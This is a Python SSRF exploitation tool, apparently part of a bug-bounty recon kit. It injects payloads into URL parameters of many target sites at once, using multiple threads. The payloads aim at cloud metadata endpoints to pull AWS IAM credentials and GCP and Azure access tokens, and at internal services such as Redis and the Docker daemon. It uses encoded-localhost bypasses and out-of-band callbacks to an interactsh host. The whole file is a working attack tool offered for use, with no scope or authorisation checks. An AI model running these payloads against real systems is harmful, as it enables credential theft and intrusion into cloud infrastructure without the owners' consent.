#!/usr/bin/env python3
# =============================================================================
#
#  ██╗   ██╗██████╗ ███╗   ██╗ ██████╗ ███╗   ███╗
#  ██║   ██║╚════██╗████╗  ██║██╔═══██╗████╗ ████║
#  ██║   ██║ █████╔╝██╔██╗ ██║██║   ██║██╔████╔██║
#  ╚██╗ ██╔╝ ╚═══██╗██║╚██╗██║██║   ██║██║╚██╔╝██║
#   ╚████╔╝ ██████╔╝██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
#    ╚═══╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
#
#  ████████╗███████╗ ██████╗██╗  ██╗
#  ╚══██╔══╝██╔════╝██╔════╝██║  ██║
#     ██║   █████╗  ██║     ███████║
#     ██║   ██╔══╝  ██║     ██╔══██║
#     ██║   ███████╗╚██████╗██║  ██║
#     ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
#
#  [ v3nom tech ]
#  Instagram : @venom.tech.official
#  GitHub    : https://github.com/v3nomtech
#
# =============================================================================
"""
ssrf_tester.py — Active SSRF Exploitation Tester
Input: ssrf_candidates.txt from venomeye output (one URL per line)

Supports:
  - OOB detection via interactsh (preferred) or webhook.site token
  - Cloud metadata endpoint probing (AWS, GCP, Azure, DigitalOcean, Oracle)
  - Blind SSRF via DNS callback
  - Time-based detection (response time anomaly)
"""

import argparse
import concurrent.futures
import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

class C:
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    CYAN="\033[96m"; BOLD="\033[1m"; RESET="\033[0m"

def info(m):  print(f"{C.CYAN}[*]{C.RESET} {m}")
def ok(m):    print(f"{C.GREEN}[+]{C.RESET} {m}")
def warn(m):  print(f"{C.YELLOW}[!]{C.RESET} {m}")
def crit(m):  print(f"{C.RED}{C.BOLD}[SSRF FOUND]{C.RESET} {m}")
def section(m): print(f"\n{C.BOLD}{C.CYAN}{'─'*60}\n  {m}\n{'─'*60}{C.RESET}")

def banner():
    print(f"""{C.CYAN}{C.BOLD}
  ██╗   ██╗██████╗ ███╗   ██╗ ██████╗ ███╗   ███╗
  ██║   ██║╚════██╗████╗  ██║██╔═══██╗████╗ ████║
  ██║   ██║ █████╔╝██╔██╗ ██║██║   ██║██╔████╔██║
  ╚██╗ ██╔╝ ╚═══██╗██║╚██╗██║██║   ██║██║╚██╔╝██║
   ╚████╔╝ ██████╔╝██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
    ╚═══╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝

  ████████╗███████╗ ██████╗██╗  ██╗
  ╚══██╔══╝██╔════╝██╔════╝██║  ██║
     ██║   █████╗  ██║     ███████║
     ██║   ██╔══╝  ██║     ██╔══██║
     ██║   ███████╗╚██████╗██║  ██║
     ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
{C.RESET}{C.GREEN}  [ v3nom tech ]  |  Instagram: @venom.tech.official  |  GitHub: https://github.com/v3nomtech
{C.RESET}""")

# ── SSRF payloads ─────────────────────────────────────────────────────────────
# Metadata endpoints to test (confirms internal access)
METADATA_PAYLOADS = [
    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # AWS IMDSv2 (needs PUT first — we try GET as fallback)
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Oracle Cloud
    "http://192.0.0.192/latest/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    # Internal localhost probes
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0177.0.0.1/",      # octal
    "http://0x7f000001/",       # hex
    "http://2130706433/",       # decimal
    # Common internal services
    "http://localhost:6379/",   # Redis
    "http://localhost:9200/",   # Elasticsearch
    "http://localhost:27017/",  # MongoDB
    "http://localhost:8500/",   # Consul
    "http://localhost:2375/",   # Docker daemon
    "http://localhost:4040/",   # ngrok / internal dashboard
]

# Bypass encodings for each payload variant
def encode_variants(url: str) -> list[str]:
    variants = [url]
    parsed = urllib.parse.urlparse(url)
    if not parsed.hostname:
        return variants
    host = parsed.hostname
    scheme = parsed.scheme

    # URL double-encode
    variants.append(url.replace("://", "%3A%2F%2F").replace("/", "%2F"))
    # Mixed case scheme
    variants.append(url.replace(scheme, scheme.upper(), 1))
    # Add a redirect wrapper (if we control a redirect)
    return variants

# Indicators that suggest SSRF succeeded
POSITIVE_INDICATORS = [
    # AWS metadata
    r"ami-id", r"instance-id", r"security-credentials",
    r"iam/", r"latest/meta-data",
    # GCP metadata
    r"computeMetadata", r"service-accounts",
    # Azure metadata
    r"\"compute\"", r"\"network\"", r"azureEnvironment",
    # Generic internal
    r"root:x:0:0", r"localhost", r"127\.0\.0\.1",
    # Redis
    r"\+PONG", r"\$\d+\r\nredis_version",
    # Elasticsearch
    r"\"cluster_name\"", r"\"tagline\"",
    # Docker
    r"\"ApiVersion\"", r"\"Containers\"",
]

POSITIVE_RE = [re.compile(p, re.IGNORECASE) for p in POSITIVE_INDICATORS]

def curl_url(url: str, timeout: int = 10) -> tuple[int, float, str]:
    """Returns (status_code, elapsed_seconds, body)."""
    start = time.time()
    try:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", str(timeout),
             "-o", "-", "-w", "\n__STATUS__%{http_code}__TIME__%{time_total}",
             "-L", "--max-redirs", "3",
             "-A", "Mozilla/5.0",
             url],
            capture_output=True, text=True, timeout=timeout + 2
        )
        elapsed = time.time() - start
        out = r.stdout
        # parse status and time from curl write-out
        m = re.search(r"__STATUS__(\d+)__TIME__([\d.]+)$", out)
        status = int(m.group(1)) if m else 0
        body = re.sub(r"\n__STATUS__\d+__TIME__[\d.]+$", "", out)
        return status, elapsed, body
    except Exception:
        return 0, time.time() - start, ""

def inject_ssrf(original_url: str, payload: str) -> str:
    """Inject SSRF payload into the parameter value of the original URL."""
    parsed = urllib.parse.urlparse(original_url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return ""
    # inject into first param
    key = list(params.keys())[0]
    params[key] = [payload]
    new_query = urllib.parse.urlencode(params, doseq=True)
    injected = parsed._replace(query=new_query)
    return urllib.parse.urlunparse(injected)

def is_positive(body: str) -> bool:
    return any(p.search(body) for p in POSITIVE_RE)

def test_url(original_url: str, oob_host: str, timeout: int) -> list[dict]:
    findings = []

    # 1. Metadata probes
    for payload in METADATA_PAYLOADS:
        injected = inject_ssrf(original_url, payload)
        if not injected:
            continue
        status, elapsed, body = curl_url(injected, timeout)
        if status in (200, 301, 302) and is_positive(body):
            finding = {
                "type": "ssrf_metadata",
                "severity": "critical",
                "url": original_url,
                "injected": injected,
                "payload": payload,
                "status": status,
                "body_snippet": body[:300],
            }
            findings.append(finding)
            crit(f"METADATA ACCESS | {original_url}")
            crit(f"  Payload : {payload}")
            crit(f"  Response: HTTP {status} | {body[:100]}")
            break  # one confirmed hit per URL is enough

    # 2. OOB / Blind SSRF via callback host
    if oob_host:
        # unique marker per URL for correlation
        marker = abs(hash(original_url)) % 100000
        oob_payload = f"http://{marker}.{oob_host}/"
        injected = inject_ssrf(original_url, oob_payload)
        if injected:
            curl_url(injected, timeout)  # fire and forget
            info(f"OOB probe sent → {oob_payload} via {original_url}")

    return findings

# ── interactsh helper ─────────────────────────────────────────────────────────
def start_interactsh() -> tuple[str, subprocess.Popen | None]:
    """Start interactsh-client and return (host, process)."""
    if not _tool_exists("interactsh-client"):
        warn("interactsh-client not found — OOB detection disabled")
        return "", None
    try:
        proc = subprocess.Popen(
            ["interactsh-client", "-json"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
        )
        time.sleep(3)
        # read first line to get the assigned host
        line = proc.stdout.readline().strip()
        data = json.loads(line)
        host = data.get("interactsh-url", "").replace("https://", "").replace("http://", "")
        ok(f"interactsh listening on: {host}")
        return host, proc
    except Exception as e:
        warn(f"Could not start interactsh: {e}")
        return "", None

def _tool_exists(name: str) -> bool:
    import shutil
    return shutil.which(name) is not None

# ── main ──────────────────────────────────────────────────────────────────────
def main():
    banner()
    parser = argparse.ArgumentParser(description="Active SSRF Tester")
    parser.add_argument("-i", "--input",    required=True, help="ssrf_candidates.txt")
    parser.add_argument("-o", "--output",   default="./ssrf_results", help="Output directory")
    parser.add_argument("--oob",            default="", help="OOB callback host (e.g. yourtoken.oast.fun)")
    parser.add_argument("-t", "--threads",  type=int, default=10, help="Threads (default 10)")
    parser.add_argument("--timeout",        type=int, default=10, help="Per-request timeout (default 10s)")
    parser.add_argument("--limit",          type=int, default=0,  help="Max URLs to test (0=all)")
    parser.add_argument("--interactsh",     action="store_true",  help="Auto-start interactsh-client for OOB")
    args = parser.parse_args()

    os.makedirs(args.output, exist_ok=True)
    section("SSRF Tester — Active Exploitation")

    try:
        urls = [l.strip() for l in open(args.input) if l.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Input file not found: {args.input}")
        sys.exit(1)

    if args.limit:
        urls = urls[:args.limit]

    oob_host = args.oob
    interactsh_proc = None

    if args.interactsh:
        oob_host, interactsh_proc = start_interactsh()

    info(f"Testing {len(urls)} URLs | threads={args.threads} | OOB={oob_host or 'disabled'}")
    info(f"Metadata payloads: {len(METADATA_PAYLOADS)}")

    all_findings: list[dict] = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as pool:
        futs = {pool.submit(test_url, u, oob_host, args.timeout): u for u in urls}
        done = 0
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            if done % 100 == 0:
                info(f"Progress: {done}/{len(urls)} | findings: {len(all_findings)}")
            try:
                findings = fut.result()
                all_findings.extend(findings)
            except Exception as e:
                warn(f"Error: {e}")

    if interactsh_proc:
        info("Waiting 15s for delayed OOB callbacks...")
        time.sleep(15)
        interactsh_proc.terminate()

    # ── outputs ───────────────────────────────────────────────────────────────
    json_out = f"{args.output}/ssrf_findings.json"
    with open(json_out, "w") as f:
        json.dump(all_findings, f, indent=2)

    report_out = f"{args.output}/ssrf_report.txt"
    with open(report_out, "w") as f:
        f.write(f"SSRF Findings — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*60}\n\n")
        if all_findings:
            for item in all_findings:
                f.write(f"[{item['severity'].upper()}] {item['type']}\n")
                f.write(f"  Original URL : {item['url']}\n")
                f.write(f"  Injected URL : {item['injected']}\n")
                f.write(f"  Payload      : {item['payload']}\n")
                f.write(f"  Response     : HTTP {item['status']}\n")
                f.write(f"  Body snippet : {item['body_snippet']}\n\n")
        else:
            f.write("No confirmed SSRF findings.\n")

    section("Results")
    ok(f"Confirmed SSRF   : {C.BOLD}{len(all_findings)}{C.RESET}")
    ok(f"Report           : {report_out}")
    ok(f"JSON             : {json_out}")

if __name__ == "__main__":
    main()
